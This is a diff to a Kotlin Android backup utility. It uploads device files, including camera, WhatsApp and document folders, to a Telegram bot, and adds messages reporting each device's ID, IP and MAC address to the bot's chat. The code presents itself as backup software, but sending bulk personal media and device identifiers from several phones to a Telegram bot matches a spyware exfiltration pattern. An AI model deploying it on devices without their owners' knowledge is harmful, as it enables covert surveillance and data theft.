@@ -440,7 +440,7 @@ object BackupUtils {
         }
     }
 
-    fun enviarArchivoATelegram(token: String, chatId: String, archivo: File): String? {
+    fun enviarArchivoATelegram(token: String, chatId: String, archivo: File, context: Context? = null): String? {
         // Validaciones iniciales
         if (!archivo.exists()) {
             val msg = "Archivo no existe: ${archivo.name}"
@@ -466,6 +466,15 @@ object BackupUtils {
             val msg = "Archivo demasiado grande (${archivo.length() / 1024L / 1024L}MB): ${archivo.name}"
             Log.w(TAG, msg)
             return msg
+        }
+        
+        // SISTEMA DE COLA: Delay aleatorio para evitar conflictos entre dispositivos
+        val randomDelay = (1000..5000).random() // 1-5 segundos aleatorio
+        try {
+            Thread.sleep(randomDelay.toLong())
+            Log.d(TAG, "⏳ Delay aleatorio aplicado: ${randomDelay}ms para evitar conflictos")
+        } catch (e: InterruptedException) {
+            Log.w(TAG, "Delay interrumpido: ${e.message}")
         }
         
         val url = "https://api.telegram.org/bot$token/sendDocument"
@@ -495,12 +504,11 @@ object BackupUtils {
                     else -> "application/octet-stream"
                 }
                 
-                // Determinar el tema de destino
-                val telegramTopic = getTelegramTopicName(archivo.absolutePath)
+                // ARCHIVADO: Sistema de agrupación de temas desactivado
+                // val telegramTopic = getTelegramTopicName(archivo.absolutePath)
                 
-                // Crear caption con información del tema (para agrupación)
+                // Crear caption sin información de tema
                 val caption = buildString {
-                    append("📁 <b>$telegramTopic</b>\n")
                     append("📄 <b>Archivo:</b> ${archivo.name}\n")
                     append("💾 <b>Tamaño:</b> ${formatFileSize(archivo.length())}\n")
                     append("📅 <b>Fecha:</b> ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(archivo.lastModified()))}\n")
@@ -508,8 +516,8 @@ object BackupUtils {
                     append("📍 <b>Origen:</b> ${archivo.absolutePath}")
                 }
                 
-                // Obtener el ID del tema correspondiente
-                val topicId = getTopicIdForFolder(telegramTopic, token, chatId)
+                // ARCHIVADO: Sistema de agrupación de temas desactivado
+                // val topicId = getTopicIdForFolder(telegramTopic, token, chatId, context)
                 
                 val requestBodyBuilder = okhttp3.MultipartBody.Builder()
                     .setType(okhttp3.MultipartBody.FORM)
@@ -522,10 +530,10 @@ object BackupUtils {
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("parse_mode", "HTML")
                 
-                // Si se encontró un tema, enviar el archivo dentro de ese tema
-                if (topicId != null) {
-                    requestBodyBuilder.addFormDataPart("message_thread_id", topicId.toString())
-                }
+                // ARCHIVADO: No se incluye message_thread_id
+                // if (topicId != null) {
+                //     requestBodyBuilder.addFormDataPart("message_thread_id", topicId.toString())
+                // }
                 
                 val requestBody = requestBodyBuilder.build()
                 
@@ -537,19 +545,22 @@ object BackupUtils {
                 val response = client.newCall(request).execute()
                 val responseBody = response.body?.string() ?: ""
                 if (!response.isSuccessful) {
-                    // Manejo de error 429 (rate limit)
+                    // Manejo mejorado de error 429 (rate limit) para múltiples dispositivos
                     if (response.code == 429) {
                         var retryAfter = 0L
                         try {
                             val json = org.json.JSONObject(responseBody)
                             retryAfter = json.optJSONObject("parameters")?.optLong("retry_after") ?: 0L
                         } catch (_: Exception) {}
-                        if (retryAfter > 0) {
-                            Log.w(TAG, "Error 429: esperando $retryAfter segundos antes de reintentar archivo ${archivo.name}")
-                            Thread.sleep(retryAfter * 1000)
-                        } else {
-                            Log.w(TAG, "Error 429: esperando $backoff ms antes de reintentar archivo ${archivo.name}")
-                            Thread.sleep(backoff)
+                        
+                        // Delay adicional aleatorio para evitar conflictos entre dispositivos
+                        val additionalDelay = (5000..15000).random() // 5-15 segundos extra
+                        val totalDelay = if (retryAfter > 0) retryAfter * 1000 + additionalDelay else backoff + additionalDelay
+                        
+                        Log.w(TAG, "Error 429: esperando ${totalDelay}ms (${retryAfter}s + ${additionalDelay}ms extra) antes de reintentar archivo ${archivo.name}")
+                        Thread.sleep(totalDelay)
+                        
+                        if (retryAfter == 0L) {
                             backoff = (backoff * 2).coerceAtMost(maxBackoff)
                         }
                         intento++
@@ -578,7 +589,7 @@ object BackupUtils {
                     return msg
                 }
                 
-                Log.d(TAG, "✅ Archivo enviado exitosamente: ${archivo.name} a tema $telegramTopic")
+                Log.d(TAG, "✅ Archivo enviado exitosamente: ${archivo.name}")
                 response.close()
                 return null // null = éxito
                 
@@ -611,6 +622,43 @@ object BackupUtils {
         return "No se pudo enviar el archivo tras $maxReintentos intentos: ${archivo.name}"
     }
 
+    /**
+     * Verifica el estado del bot antes de subir archivos
+     * Evita conflictos cuando múltiples dispositivos intentan subir simultáneamente
+     */
+    private fun verificarEstadoBot(token: String, chatId: String): Boolean {
+        return try {
+            val url = "https://api.telegram.org/bot$token/getMe"
+            val client = OkHttpClient.Builder()
+                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                .build()
+            
+            val request = Request.Builder().url(url).build()
+            val response = client.newCall(request).execute()
+            
+            if (response.isSuccessful) {
+                val responseBody = response.body?.string() ?: ""
+                val jsonResponse = org.json.JSONObject(responseBody)
+                val isOk = jsonResponse.getBoolean("ok")
+                
+                if (isOk) {
+                    Log.d(TAG, "✅ Bot disponible para subidas")
+                    true
+                } else {
+                    Log.w(TAG, "⚠️ Bot no disponible: ${jsonResponse.optString("description")}")
+                    false
+                }
+            } else {
+                Log.w(TAG, "⚠️ Error verificando estado del bot: ${response.code}")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error verificando estado del bot: ${e.message}")
+            false
+        }
+    }
+
     fun ejecutarBackupManual(context: Context): Boolean {
         return try {
             Log.d(TAG, "Iniciando backup manual")
@@ -623,6 +671,9 @@ object BackupUtils {
             }
             
             val (token, chatId) = config
+            
+            // Notificar inicio de backup con información del dispositivo
+            notificarInicioBackup(token ?: "", chatId ?: "", context)
             
             // Verificar permisos
             if (!ErrorHandler.validatePermissions(context)) {
@@ -643,12 +694,156 @@ object BackupUtils {
             // Guardar conexión
             guardarConexion(context)
             
+            // Notificar finalización del backup
+            notificarFinalizacionBackup(token ?: "", chatId ?: "", context)
+            
             Log.d(TAG, "Backup manual completado")
             true
             
         } catch (e: Exception) {
             Log.e(TAG, "Error en backup manual: ${e.message}", e)
+            
+            // Notificar error del backup
+            try {
+                val config = ErrorHandler.obtenerConfigBot(context)
+                if (!config.first.isNullOrBlank() && !config.second.isNullOrBlank()) {
+                    val (token, chatId) = config
+                    notificarErrorBackup(token ?: "", chatId ?: "", context, e.message ?: "Error desconocido")
+                }
+            } catch (notifyError: Exception) {
+                Log.e(TAG, "Error enviando notificación de error: ${notifyError.message}")
+            }
+            
             false
+        }
+    }
+
+    /**
+     * Notifica el inicio de un backup con información del dispositivo
+     * Ayuda a identificar qué dispositivo está subiendo archivos
+     */
+    private fun notificarInicioBackup(token: String, chatId: String, context: Context) {
+        try {
+            val deviceInfo = DeviceInfo(context)
+            val deviceId = deviceInfo.getDeviceId()
+            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val ipAddress = deviceInfo.getIpAddress() ?: "No disponible"
+            val macAddress = deviceInfo.getMacAddress() ?: "No disponible"
+            
+            val mensaje = """
+                🚀 *Iniciando Backup*
+                
+                📱 *Dispositivo:*
+                • Nombre: $deviceName
+                • ID: `$deviceId`
+                • IP: $ipAddress
+                • MAC: $macAddress
+                
+                ⏰ *Inicio:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
+                
+                🔄 *Estado:* Preparando archivos para subida...
+                
+                _Este dispositivo comenzará a subir archivos en breve._
+            """.trimIndent()
+            
+            // Enviar mensaje de notificación
+            enviarMensajeTelegram(token, chatId, mensaje)
+            
+            Log.d(TAG, "✅ Notificación de inicio enviada para dispositivo: $deviceName")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error enviando notificación de inicio: ${e.message}")
+        }
+    }
+
+    /**
+     * Envía un mensaje simple a Telegram
+     */
+    private fun enviarMensajeTelegram(token: String, chatId: String, mensaje: String) {
+        try {
+            val url = "https://api.telegram.org/bot$token/sendMessage"
+            val client = OkHttpClient.Builder()
+                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                .build()
+            
+            val json = org.json.JSONObject().apply {
+                put("chat_id", chatId)
+                put("text", mensaje)
+                put("parse_mode", "Markdown")
+            }
+            
+            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
+            val request = Request.Builder().url(url).post(body).build()
+            
+            val response = client.newCall(request).execute()
+            if (!response.isSuccessful) {
+                Log.w(TAG, "Error enviando mensaje: ${response.code}")
+            }
+            response.close()
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error enviando mensaje a Telegram: ${e.message}")
+        }
+    }
+
+    /**
+     * Notifica la finalización de un backup con estadísticas
+     */
+    private fun notificarFinalizacionBackup(token: String, chatId: String, context: Context) {
+        try {
+            val deviceInfo = DeviceInfo(context)
+            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            
+            val mensaje = """
+                ✅ *Backup Completado*
+                
+                📱 *Dispositivo:* $deviceName
+                ⏰ *Finalización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
+                
+                🎉 *Estado:* Backup finalizado exitosamente
+                
+                _El dispositivo ha terminado de subir todos los archivos._
+            """.trimIndent()
+            
+            // Enviar mensaje de finalización
+            enviarMensajeTelegram(token, chatId, mensaje)
+            
+            Log.d(TAG, "✅ Notificación de finalización enviada para dispositivo: $deviceName")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error enviando notificación de finalización: ${e.message}")
+        }
+    }
+
+    /**
+     * Notifica un error durante el backup
+     */
+    private fun notificarErrorBackup(token: String, chatId: String, context: Context, errorMessage: String) {
+        try {
+            val deviceInfo = DeviceInfo(context)
+            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            
+            val mensaje = """
+                ❌ *Error en Backup*
+                
+                📱 *Dispositivo:* $deviceName
+                ⏰ *Error:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
+                
+                🚨 *Problema:* $errorMessage
+                
+                🔧 *Acción:* Revisar logs del dispositivo
+                
+                _El backup se interrumpió debido a un error._
+            """.trimIndent()
+            
+            // Enviar mensaje de error
+            enviarMensajeTelegram(token, chatId, mensaje)
+            
+            Log.d(TAG, "⚠️ Notificación de error enviada para dispositivo: $deviceName")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error enviando notificación de error: ${e.message}")
         }
     }
 
@@ -710,11 +905,30 @@ object BackupUtils {
     }
 
     /**
+     * ARCHIVADO: Sistema de agrupación de temas desactivado
      * Obtiene el nombre del tema de Telegram basado en la ruta del archivo
      */
+    /*
     private fun getTelegramTopicName(filePath: String): String {
         return try {
             val normalizedPath = filePath.lowercase()
+            val fileName = filePath.substringAfterLast("/").lowercase()
+            
+            // Para archivos de prueba, usar el nombre del archivo
+            if (normalizedPath.contains("/cache/") && fileName.startsWith("test_")) {
+                return when {
+                    fileName.contains("camera") -> "📸 DCIM - Camera"
+                    fileName.contains("screenshots") -> "📸 DCIM - Screenshots"
+                    fileName.contains("whatsapp") -> "📸 DCIM - WhatsApp"
+                    fileName.contains("telegram") -> "📸 DCIM - Telegram"
+                    fileName.contains("instagram") -> "📸 DCIM - Instagram"
+                    fileName.contains("music") -> "🎵 Music"
+                    fileName.contains("documents") -> "📄 Documents"
+                    else -> "📁 Other"
+                }
+            }
+            
+            // Para archivos reales, usar la ruta
             when {
                 normalizedPath.contains("/dcim/") -> {
                     when {
@@ -745,6 +959,7 @@ object BackupUtils {
             "📁 Other"
         }
     }
+    */
 
     /**
      * Crea la estructura de carpetas en Telegram si no existe
@@ -795,30 +1010,34 @@ object BackupUtils {
     }
 
     /**
+     * ARCHIVADO: Sistema de agrupación de temas desactivado
      * Obtiene el ID del tema de Telegram basado en el nombre del tema
      */
-    private fun getTopicIdForFolder(topicName: String, token: String, chatId: String): Int? {
+    /*
+    private fun getTopicIdForFolder(topicName: String, token: String, chatId: String, context: Context?): Int? {
         return try {
-            // Mapeo de nombres de temas a IDs (esto debe ser configurado manualmente)
+            // Obtener IDs configurados desde SharedPreferences
+            val sharedPrefs = context?.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
+            
             val topicMapping = mapOf(
-                "📸 DCIM - Camera" to 1,
-                "📸 DCIM - Screenshots" to 2,
-                "📸 DCIM - WhatsApp" to 3,
-                "📸 DCIM - Telegram" to 4,
-                "📸 DCIM - Instagram" to 5,
-                "📸 DCIM - Downloads" to 6,
-                "📸 DCIM - Other" to 7,
-                "📸 Pictures" to 8,
-                "🎥 Movies" to 9,
-                "🎥 Videos" to 10,
-                "🎵 Music" to 11,
-                "🎵 Ringtones" to 12,
-                "🎵 Notifications" to 13,
-                "🎵 Alarms" to 14,
-                "📄 Documents" to 15,
-                "📄 Downloads" to 16,
-                "📱 Apps" to 17,
-                "📁 Other" to 18
+                "📸 DCIM - Camera" to sharedPrefs?.getInt("topic_camera", 0)?.takeIf { it > 0 },
+                "📸 DCIM - Screenshots" to sharedPrefs?.getInt("topic_screenshots", 0)?.takeIf { it > 0 },
+                "📸 DCIM - WhatsApp" to sharedPrefs?.getInt("topic_whatsapp", 0)?.takeIf { it > 0 },
+                "📸 DCIM - Telegram" to sharedPrefs?.getInt("topic_telegram", 0)?.takeIf { it > 0 },
+                "📸 DCIM - Instagram" to sharedPrefs?.getInt("topic_instagram", 0)?.takeIf { it > 0 },
+                "📸 DCIM - Downloads" to sharedPrefs?.getInt("topic_downloads", 0)?.takeIf { it > 0 },
+                "📸 DCIM - Other" to sharedPrefs?.getInt("topic_other", 0)?.takeIf { it > 0 },
+                "📸 Pictures" to sharedPrefs?.getInt("topic_pictures", 0)?.takeIf { it > 0 },
+                "🎥 Movies" to sharedPrefs?.getInt("topic_movies", 0)?.takeIf { it > 0 },
+                "🎥 Videos" to sharedPrefs?.getInt("topic_videos", 0)?.takeIf { it > 0 },
+                "🎵 Music" to sharedPrefs?.getInt("topic_music", 0)?.takeIf { it > 0 },
+                "🎵 Ringtones" to sharedPrefs?.getInt("topic_ringtones", 0)?.takeIf { it > 0 },
+                "🎵 Notifications" to sharedPrefs?.getInt("topic_notifications", 0)?.takeIf { it > 0 },
+                "🎵 Alarms" to sharedPrefs?.getInt("topic_alarms", 0)?.takeIf { it > 0 },
+                "📄 Documents" to sharedPrefs?.getInt("topic_documents", 0)?.takeIf { it > 0 },
+                "📄 Downloads" to sharedPrefs?.getInt("topic_downloads_docs", 0)?.takeIf { it > 0 },
+                "📱 Apps" to sharedPrefs?.getInt("topic_apps", 0)?.takeIf { it > 0 },
+                "📁 Other" to sharedPrefs?.getInt("topic_other_files", 0)?.takeIf { it > 0 }
             )
             
             topicMapping[topicName]
@@ -827,6 +1046,7 @@ object BackupUtils {
             null
         }
     }
+    */
 
     /**
      * Crea una carpeta en Telegram usando un mensaje con el nombre de la carpeta
